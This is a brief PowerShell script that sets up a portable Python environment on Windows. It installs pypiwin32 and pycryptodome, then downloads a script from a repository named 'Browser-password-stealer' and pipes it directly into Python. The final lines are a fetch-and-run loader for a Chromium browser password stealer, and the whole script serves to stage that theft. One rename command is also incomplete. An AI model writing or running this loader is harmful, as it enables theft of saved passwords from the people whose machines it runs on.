# Create directory for Python
New-Item -Path "py" -ItemType Directory

# Change directory to py child folder
cd .\py

# Download Python embedded zip package
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.5/python-3.12.5-embed-amd64.zip" -OutFile ".\python3.zip"

# Extract the downloaded Python zip package
Expand-Archive -Path ".\python3.zip"

# Rename the _pth file to allow customization
mv .\python3\python312._pth

# Create DLLs directory for Python
New-Item -Path ".\python3\DLLs" -ItemType Directory

# Download get-pip script
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "get-pip.py"

# Install pip using the downloaded script
.\python3\python.exe .\get-pip.py

# Install required Python packages from requirements.txt
.\python3\python.exe -m pip install pypiwin32
.\python3\python.exe -m pip install pycryptodome

# Run the script
$scriptUrl = "https://raw.githubusercontent.com/nathansb2022/Browser-password-stealer/master/chromium_based_browsers.py"
(Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).content |.\python3\python.exe





